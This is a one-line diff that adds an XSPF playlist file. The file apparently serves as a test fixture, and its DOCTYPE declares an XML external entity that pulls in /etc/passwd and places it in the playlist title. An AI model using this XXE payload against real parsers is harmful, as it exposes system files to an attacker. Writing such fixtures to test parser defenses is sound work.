@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE playlist [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><playlist xmlns="http://xspf.org/ns/0/"><title>&xxe;</title></playlist>
